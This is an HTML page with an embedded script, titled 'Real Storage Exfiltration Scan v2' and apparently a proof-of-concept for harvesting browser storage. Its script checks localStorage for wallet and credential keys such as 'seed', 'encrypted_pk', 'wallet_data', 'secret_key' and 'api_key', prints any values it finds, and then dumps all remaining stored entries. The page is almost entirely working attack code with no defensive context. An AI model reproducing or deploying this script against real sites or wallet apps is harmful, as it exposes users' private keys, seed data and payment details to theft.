<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { 
            background: #000; 
            color: #0f0; 
            font-family: 'Courier New', Courier, monospace; 
            padding: 15px; 
            font-size: 13px; 
            line-height: 1.4;
        }
        pre {
            white-space: pre-wrap; 
            word-wrap: break-word;
            margin: 0;
            padding: 5px;
            border-bottom: 1px solid #333;
        }
        .header { color: #fff; font-weight: bold; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="header">[+] Real Storage Exfiltration Scan v2</div>
    <div id="output"></div>

    <script>
        const output = document.getElementById('output');
        
        function log(message) {
            const el = document.createElement('pre');
            el.textContent = message;
            output.appendChild(el);
        }

        log("Scanning for sensitive keys...");
        
        const sensitiveKeys = ['vault', 'wallet_data', 'encrypted_pk', 'seed', 'enc_pk', 'user_vault', 'web3_session', 'secret_key', 'user_profile', 'payment_method', 'api_key'];
        let found = false;

        // Cek kunci sensitif
        sensitiveKeys.forEach(key => {
            const data = localStorage.getItem(key);
            if (data) {
                found = true;
                log(`[FOUND] Key: ${key} | Value: ${data}`);
            }
        });

        // Scan sisa storage
        log("Scanning remaining storage...");
        for (let i = 0; i < localStorage.length; i++) {
            const k = localStorage.key(i);
            if (!sensitiveKeys.includes(k)) {
                const v = localStorage.getItem(k);
                log(`Key: ${k} | Value: ${v}`);
            }
        }

        log("--- Scan Finished ---");
    </script>
</body>
</html>
